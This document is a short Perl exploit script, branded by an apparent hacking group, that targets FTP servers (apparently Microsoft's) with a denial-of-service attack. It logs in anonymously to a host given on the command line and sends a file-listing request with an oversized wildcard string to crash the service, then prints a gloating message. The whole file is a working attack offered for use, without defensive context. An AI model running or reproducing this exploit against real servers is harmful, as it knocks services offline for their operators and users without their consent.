#!/usr/bin/perl

 use Net::FTP; 

        $wildcard='*********************************************************************************************************';

if (not $ARGV[0]) {

print qq~
Ashiyane Digital Security Team
==============================
www.ashiyane.com
==============================

Usage: FukMSFtp.EXE <host>

ERR Codes:
line 44. ====>   FTP is not present and/or Connection error
No Error ====>   DoS was Successful

~;

        exit;}


        $IPaddress= $ARGV[0];


        $SIG {'PIPE'} = FoundIt;

        # create new FTP connection w/30 second timeout
        $ftp = Net::FTP->new($IPaddress, Timeout =>  5);

        if(!$ftp){ die"$Connection Error";}

        if(!$ftp->login("anonymous","tester\@")){ die"Anonymous on $IPaddress NOT ALLOWED!!!";}

        $bogus = $ftp->ls($wildcard);


sub FoundIt
        {
        print "Say bye bye to \($IPaddress\) ;) Muhahahaha\n";
	exit(0);

        }

